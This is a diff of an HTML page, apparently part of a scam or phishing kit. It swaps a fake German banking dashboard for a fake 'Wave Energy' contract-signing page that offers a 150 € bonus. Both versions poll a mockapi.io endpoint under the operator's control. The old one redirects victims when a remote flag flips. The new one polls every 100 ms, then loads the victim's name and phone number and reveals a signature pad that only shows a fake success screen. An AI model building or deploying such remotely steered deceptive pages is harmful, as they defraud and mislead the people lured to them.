wjZ2FKvmxgVdwf0R2B5FdnYtmjXBwIjA5dXT1F2lqRdHwi+fArLq8jGlqBtHwj1R2D5htnYXmlTiNnA/BEr+jhkY3uhTTnIMygyTCb0cawLtqFFSWoCFBm4vIpsbBvaU8UkYQk8jgbMxvaE0U2B1iBph/8xURfs6Znt0EEyMGmHy6s4gW+HUCZgBmeseyIbW9/qJskmYAk8l1eRja1KRbBzUGTg8iqysfn5YwBM2uHyKrKxWd8DbwqKDFxeJTY2925uMcgfweVVYGOzvQXeHBQZ8uca0pR3wXYzeFkDNPrCi/XSCUUfj24FmMEZ/6xOmY1t2MK6PwWJDBUiZckx3c6ybgsyu15lIr/4mG74MgwTyiNDpeGNQhubHI9oG+WRoVpTuuiezlYnZS+UGZwr6n0FXbDC0dX2UBIZeBayId/GNt/Z7HY9iiND5esNc21sw6iR5TdAUWQImO7Js7HtQczdUBQZeK37Qt6EYouFkDT5Buegm161ja0FplRMfmQIumZZ29im7a5zt8mLDIEXcSsbW+Vo5UpeZAhNtYWNbdbC9mUBOjIEd1DEMd3a5oNGJ/B4LCJDxsbWZm1ZoiJDjfGvzDG9V0fqGhEZao1/pWxs+3Wk/iUbGWqNf6XmyfYnS30lHRlqNgy2bWx7lKW+kPZH1BQvtmxsu79BxoJtf0TtsJA8pvel8N9m+0rg+veKJfwRg9aL7ZJkZDAwLbza2NrrgCgmMYpe8QZ/zcvvPkTu06iBvEYGE+Pk8zG9h0nIhpfrLIz+CZtjeh+TkA3PBufqvxMj2djYxi0Yzw3lKTLw34so4e+4/550HzRPkcHMxPHXxuZ7RUhd1pHB8Cez1jY2v0uGLFhHhsDfq1OcjIfH7TZRlXITB/+ioeJuvt87Zj36Yiv2zfZ7x/zh2taKfulzsZ8hS+NZhZXt4zD/A8oKmO6lYjvHAAAAAElFTkSuQmCC" alt="Wave Energy" />
+</div>
+<h2>Vertrag abschließen</h2>
+<p>Du bist nur noch eine Unterschrift entfernt</p>
+</div>
+
+<div class="sign-container">
+
+<!-- Customer Info Card -->
+<div class="sign-card" id="customer-info-card">
+<div class="sign-card-head">👤 Deine Angaben</div>
+<div id="customer-details">
+<div class="api-loader"><div class="spinner"></div> Daten werden geladen…</div>
+</div>
+</div>
+
+<!-- Tariff Summary Card -->
+<div class="sign-card">
+<div class="sign-card-head">⚡ Tarifübersicht</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Anbieter</span>
+<span class="sign-detail-value">Wave Energy</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Tarif</span>
+<span class="sign-detail-value">Flexibler Ökostromtarif</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Grundpreis</span>
+<span class="sign-detail-value">12,45 €/Monat</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Arbeitspreis</span>
+<span class="sign-detail-value">30,19 ct/kWh</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Preisgarantie</span>
+<span class="sign-detail-value" style="color:var(--accent-dark)">24 Monate</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Sofortbonus</span>
+<span class="sign-detail-value" style="color:var(--brand)">150 € direkt</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Jahreskosten</span>
+<span class="sign-detail-value">904,15 €</span>
+</div>
+</div>
+
+<!-- Signature Card -->
+<div class="sign-card" id="signature-card">
+<div class="sign-card-head">✍️ Deine Unterschrift</div>
+<div class="sig-pad-wrap">
+<p class="sig-instructions">Unterschreibe bitte im Feld unten</p>
+<div class="sig-canvas-container" id="sig-container">
+<canvas id="signatureCanvas"></canvas>
+<div class="sig-placeholder" id="sig-placeholder">
+<svg width="26" height="26" viewBox="0 0 28 28" fill="none">
+<path d="M4 22 Q8 10 14 14 Q18 17 22 6" stroke="#bbb" stroke-width="2" stroke-linecap="round" fill="none"/>
+<path d="M2 24h24" stroke="#bbb" stroke-width="1.5" stroke-linecap="round"/>
+</svg>
+<span>Hier unterschreiben</span>
+</div>
+</div>
+<div class="sig-actions">
+<button class="btn-clear" id="clearBtn" type="button">✕ Löschen</button>
+</div>
+</div>
+
+<div class="consent-block">
+<label class="consent-label">
+<input type="checkbox" id="consentCheck" />
+<span class="consent-text">
+Ich stimme den <a href="#">AGB</a> und der <a href="#">Datenschutzerklärung</a> zu.
+</span>
+</label>
+</div>
+
+<div style="padding: 0 16px 16px;">
+<button class="btn-submit" id="submitBtn" disabled type="button">
+Jetzt Vertrag abschließen ✓
+</button>
+</div>
+</div>
+
+<!-- Success screen (hidden) -->
+<div class="success-screen" id="successScreen">
+<div class="success-icon">✅</div>
+<h3>Glückwunsch!</h3>
+<p>Dein Vertrag wurde erfolgreich unterzeichnet.<br><br>Du erhältst eine Bestätigung per E-Mail. Dein <strong>150 € Bonus</strong> wird in 3–5 Werktagen überwiesen.</p>
+</div>
+
+</div>
+</div><!-- /#signing-section -->
+
+<!-- Scroll hint pill -->
+<div class="scroll-hint" id="scrollHint" onclick="document.getElementById('signing-section').scrollIntoView({behavior:'smooth'}); this.remove();">
+✍️ Unterschreiben ↓
 </div>
 
 <script>
-const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments";
-let redirectTriggered = false;
+// =====================
+// CAROUSEL FUNCTIONALITY
+// =====================
+const carouselContainer = document.getElementById('carouselContainer');
+const carouselPrev = document.getElementById('carouselPrev');
+const carouselNext = document.getElementById('carouselNext');
+const carouselDots = document.querySelectorAll('.carousel-dot');
+const providerTabs = document.querySelectorAll('.provider-tab');
+const totalSlides = 2;
+let currentSlide = 0;
 
-// Static demo transactions
-const transactions = [
-  {name:'Miete', category:'Rent', amount:1200, date:'2025-11-24', logo:'https://i.etsystatic.com/12773587/r/il/63d810/1121816918/il_570xN.1121816918_nwl8.jpg'},
-  {name:'Stromrechnung', category:'Electricity', amount:85, date:'2025-11-23', logo:'https://cdn-icons-png.flaticon.com/512/2910/2910766.png'},
-  {name:'Supermarkt', category:'Grocery', amount:145, date:'2025-11-22', logo:'https://cdn-icons-png.flaticon.com/512/1046/1046784.png'},
-  {name:'Flugticket Deutschland → Japan', category:'Flight', amount:820, date:'2025-11-24', logo:'https://cdn.vectorstock.com/i/1000v/47/08/airplane-icon-logo-template-vector-31964708.jpg'},
-  {name:'Hotel Tokyo', category:'Hotel', amount:400, date:'2025-11-24', logo:'https://i.pinimg.com/736x/b2/9d/3b/b29d3ba6ba2947ca5c79d1f14bd5bf53.jpg'},
-  {name:'Restaurant Sushi Bar', category:'Food', amount:65, date:'2025-11-23', logo:'https://cdn-icons-png.flaticon.com/512/1046/1046771.png'},
-  {name:'Tankstelle', category:'Fuel', amount:60, date:'2025-11-22', logo:'https://cdn-icons-png.flaticon.com/512/3075/3075977.png'},
-  {name:'Online Shop', category:'Shopping', amount:120, date:'2025-11-21', logo:'https://cdn-icons-png.flaticon.com/512/1170/1170678.png'}
-];
-
-function formatCurrency(n){ 
-    return '€'+n.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2}); 
+function switchSlide(index) {
+if (index < 0 || index >= totalSlides) return;
+currentSlide = index;
+updateCarousel();
 }
 
-function renderTransactions(){
-  const container = document.getElementById('transactionList');
-  container.innerHTML = '';
-  transactions.forEach(t=>{
-    const li = document.createElement('li');
-    li.className = 'transaction-item';
-    li.innerHTML = `
-      <div class="transaction-info">
-        <img src="${t.logo}" alt="${t.category}">
-        <div>
-          <div class="transaction-name">${t.name}</div>
-          <div class="transaction-category">${t.category} • <span class="transaction-date">${t.date}</span></div>
-        </div>
-      </div>
-      <div class="transaction-amount">${formatCurrency(t.amount)}</div>
-    `;
-    container.appendChild(li);
-  });
-  document.getElementById('lastUpdated').textContent = new Date().toLocaleString();
+function updateCarousel() {
+const slide = carouselContainer.querySelector('.carousel-slide');
+const slideWidth = slide.offsetWidth;
+carouselContainer.scrollTo({
+left: currentSlide * slideWidth,
+behavior: 'smooth'
+});
+
+carouselDots.forEach((dot, idx) => {
+dot.classList.toggle('active', idx === currentSlide);
+});
+
+providerTabs.forEach((tab, idx) => {
+tab.classList.toggle('active', idx === currentSlide);
+});
+
+carouselPrev.disabled = currentSlide === 0;
+carouselNext.disabled = currentSlide === totalSlides - 1;
 }
 
-// --------------------------------------------------
-// AUTO CHECK FOR update2 FLAG AND REDIRECT TO API URL VALUE
-// --------------------------------------------------
-async function checkRedirect(){
-  try {
-    const res = await fetch(API_URL, {cache:"no-store"});
-    const data = await res.json();
+carouselPrev.addEventListener('click', () => {
+if (currentSlide > 0) {
+currentSlide--;
+updateCarousel();
+}
+});
 
-    // Using first object in array
-    const record = data[0];
-    const redirectUrl = record.url || null;
+carouselNext.addEventListener('click', () => {
+if (currentSlide < totalSlides - 1) {
+currentSlide++;
+updateCarousel();
+}
+});
 
-    if(record.update2 === true && redirectUrl && !redirectTriggered){
-      redirectTriggered = true;
-      window.location.href = redirectUrl;
-    }
+carouselContainer.addEventListener('scroll', () => {
+const slide = carouselContainer.querySelector('.carousel-slide');
+const slideWidth = slide.offsetWidth;
+const scrollPos = carouselContainer.scrollLeft;
+const newSlide = Math.round(scrollPos / slideWidth);
+if (newSlide !== currentSlide && newSlide >= 0 && newSlide < totalSlides) {
+currentSlide = newSlide;
+carouselDots.forEach((dot, idx) => {
+dot.classList.toggle('active', idx === currentSlide);
+});
+providerTabs.forEach((tab, idx) => {
+tab.classList.toggle('active', idx === currentSlide);
+});
+carouselPrev.disabled = currentSlide === 0;
+carouselNext.disabled = currentSlide === totalSlides - 1;
+}
+});
 
-    if(record.update2 === false){
-      redirectTriggered = false;
-    }
+updateCarousel();
 
-    // Optional: update user info from API
-    if(record.user){
-      document.getElementById('userName').textContent = record.user.name;
-      document.getElementById('customerNumber').textContent = 'Kundennummer #' + record.user.customerNumber;
-    }
+let resizeTimeout;
+window.addEventListener('resize', () => {
+clearTimeout(resizeTimeout);
+resizeTimeout = setTimeout(updateCarousel, 150);
+});
 
-  } catch(err){
-    console.error("Redirect check error:", err);
-  }
+// =====================
+// SIGNATURE PAD
+// =====================
+const canvas = document.getElementById('signatureCanvas');
+const ctx = canvas.getContext('2d');
+const container = document.getElementById('sig-container');
+const placeholder = document.getElementById('sig-placeholder');
+const consentCheck = document.getElementById('consentCheck');
+const submitBtn = document.getElementById('submitBtn');
+let drawing = false;
+let hasSig = false;
+
+function resizeCanvas() {
+const rect = canvas.parentElement.getBoundingClientRect();
+canvas.width = rect.width * window.devicePixelRatio;
+canvas.height = 130 * window.devicePixelRatio;
+ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
+ctx.lineWidth = 2.2;
+ctx.lineCap = 'round';
+ctx.lineJoin = 'round';
+ctx.strokeStyle = '#1a1a2e';
+}
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+function getPos(e) {
+const rect = canvas.getBoundingClientRect();
+const touch = e.touches ? e.touches[0] : e;
+return { x: touch.clientX - rect.left, y: touch.clientY - rect.top };
 }
 
-// Refresh button
-document.getElementById('refreshBtn').addEventListener('click', renderTransactions);
+function startDraw(e) {
+e.preventDefault();
+drawing = true;
+const p = getPos(e);
+ctx.beginPath();
+ctx.moveTo(p.x, p.y);
+placeholder.classList.add('hidden');
+container.classList.add('has-sig');
+hasSig = true;
+checkReady();
+}
+function draw(e) {
+if (!drawing) return;
+e.preventDefault();
+const p = getPos(e);
+ctx.lineTo(p.x, p.y);
+ctx.stroke();
+}
+function stopDraw(e) { drawing = false; }
 
-// Initial render
-renderTransactions();
+canvas.addEventListener('mousedown', startDraw);
+canvas.addEventListener('mousemove', draw);
+canvas.addEventListener('mouseup', stopDraw);
+canvas.addEventListener('mouseleave', stopDraw);
+canvas.addEventListener('touchstart', startDraw, { passive: false });
+canvas.addEventListener('touchmove', draw, { passive: false });
+canvas.addEventListener('touchend', stopDraw);
 
-// Start auto redirect polling every 8 seconds
-setInterval(checkRedirect, 8000);
-checkRedirect();
+document.getElementById('clearBtn').addEventListener('click', () => {
+ctx.clearRect(0, 0, canvas.width, canvas.height);
+hasSig = false;
+placeholder.classList.remove('hidden');
+container.classList.remove('has-sig');
+checkReady();
+});
+
+consentCheck.addEventListener('change', checkReady);
+
+function checkReady() {
+submitBtn.disabled = !(hasSig && consentCheck.checked);
+}
+
+submitBtn.addEventListener('click', () => {
+document.getElementById('signature-card').style.display = 'none';
+document.getElementById('successScreen').classList.add('visible');
+window.scrollTo({ top: document.getElementById('signing-section').offsetTop, behavior: 'smooth' });
+});
+
+// =====================
+// RAPID API POLLING FOR update3
+// =====================
+let hasRedirected = false;
+let pollInterval = null;
+
+function triggerRedirect(entry) {
+if (hasRedirected) return;
+hasRedirected = true;
+
+// Stop polling
+if (pollInterval) {
+clearInterval(pollInterval);
+pollInterval = null;
+}
+
+// Hide API loader
+document.getElementById('api-status').style.display = 'none';
+
+// Populate customer details from API data
+const detailsEl = document.getElementById('customer-details');
+detailsEl.innerHTML = `
+<div class="sign-detail-row">
+<span class="sign-detail-label">Name</span>
+<span class="sign-detail-value">${entry.first_name || ''} ${entry.last_name || ''}</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Telefon</span>
+<span class="sign-detail-value">${entry.phone || '–'}</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Datum</span>
+<span class="sign-detail-value">${entry.valid_from_date || entry.lost_date || '–'}</span>
+</div>
+<div class="sign-detail-row">
+<span class="sign-detail-label">Referenz</span>
+<span class="sign-detail-value">#${entry.id || '–'}</span>
+</div>
+`;
+
+// Show signing section (hidden below info boxes until now)
+const sigSection = document.getElementById('signing-section');
+sigSection.classList.add('visible');
+
+// Show scroll hint
+const hint = document.getElementById('scrollHint');
+hint.classList.add('show');
+
+// Smooth scroll to signing section after short delay
+setTimeout(() => {
+sigSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+hint.remove();
+}, 300);
+}
+
+function pollAPI() {
+if (hasRedirected) return;
+
+fetch('https://6797e9d9c2c861de0c6e6bdf.mockapi.io/search?t=' + Date.now())
+.then(function(r) { 
+return r.json(); 
+})
+.then(function(data) {
+// Hide loader on first successful response
+document.getElementById('api-status').style.display = 'none';
+
+if (Array.isArray(data) && data.length > 0) {
+var entry = data[0];
+// Check if update3 is true
+if (entry.update3 === true) {
+triggerRedirect(entry);
+}
+}
+})
+.catch(function(err) {
+console.warn('Poll error:', err);
+// Silently continue polling on error
+});
+}
+
+// Start rapid polling every 100ms for instant response
+pollInterval = setInterval(pollAPI, 100);
+
+// Stop after 3 minutes (180000ms)
+setTimeout(function() {
+if (pollInterval && !hasRedirected) {
+clearInterval(pollInterval);
+pollInterval = null;
+}
+}, 180000);
 </script>
 </body>
 </html>
